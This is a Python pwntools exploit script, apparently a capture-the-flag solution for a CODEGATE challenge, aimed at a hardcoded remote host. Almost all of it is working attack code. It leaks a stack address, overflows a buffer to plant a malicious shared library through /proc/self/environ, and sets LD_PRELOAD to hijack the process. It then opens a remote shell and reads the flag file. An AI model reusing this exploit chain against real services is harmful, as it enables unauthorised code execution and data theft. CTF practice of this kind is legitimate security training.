#!/usr/bin/env python
from pwn import *

# CODEGATE{24cb1590e54e43b254c99404e4f86543}

context.arch = 'amd64'
host , port = '110.10.147.113' , 6677

def put( voucher ):
    y.sendlineafter( '6) exit' , '1' )
    y.sendlineafter( 'input voucher :' , voucher )

def mer( fromm ):
    y.sendlineafter( '6) exit' , '2' )
    y.sendlineafter( 'input old voucher :' , fromm )

def lot( a ):
    y.sendlineafter( '6) exit' , '3' )
    for i in a:
        y.sendline( i )

def slot():
    y.sendlineafter( '6) exit' , '5' )
    y.sendlineafter( 'press any key' , '' )


'''
maps
mem
stack
environ
'''

while True:

    y = remote( host , port )

    slot()
    p = [ '1' , 'a' , 'a' , '1' , 'a' , '1' , '1' , '1'  ]
    lot( p )

    y.recvuntil( '===================' )
    y.recvuntil( '===================\n' )
    stk = int( y.recvuntil( ' :' )[:-2] )
    y.recvline()
    stk += int( y.recvuntil( ' :' )[:-2] ) << 32
    stk += 0x70
    success( 'stack -> %s' % hex( stk ) )

    env = (( stk + 0x2000 ) & 0xfffffffff000) + 0x273 + 1 # for len(ip) == 13
    info( 'environ -> %s' % hex( env ) )

    evnp = flat(
        0, 0,       # argv
        0, env ,    # envp
        0, 0,
    )

    hook = open( './hook.so' ).read().replace( '\n' , '\x00' )

    hook_so = 'ho0o0o0o0o0o0o0o0o0o0o0o0o0o0k'
    version = '.00'

    put( hook_so + version )

    mer( ( '/proc/self/environ'.rjust( 0x20 , '/' ).ljust( 0xe0 , '\x00' ) + evnp ).ljust( env - stk, '\x00' ) + hook )

    try:
        y.sendlineafter( '6) exit' , '6' )
        y.close()
        success( 'Upload hook.so succeed!' )
        break
    except:
        y.close()

# for LD_PRELOAD
y = remote( host , port )

slot()
p = [ '1' , '+' , '+' , '1' , '+' , '1' , '1' , '1'  ]
lot( p )

y.recvuntil( '===================' )
y.recvuntil( '===================\n' )
stk = int( y.recvuntil( ' :' )[:-2] )
y.recvline()
stk += int( y.recvuntil( ' :' )[:-2] ) << 32
success( 'stack -> %s' % hex( stk ) )

mer( ('a' * 0x40 + "LD_PRELOAD=./" + hook_so + version ).ljust( 0x128 , '\x00' ) + p64( stk + 0xb0 ) + p64( 0 ) ) 

y.sendlineafter( '>' , '5' )
y.sendlineafter( 'press any key' , '7' ) # hooked !

y.sendline( 'cat ../f*' )

y.interactive()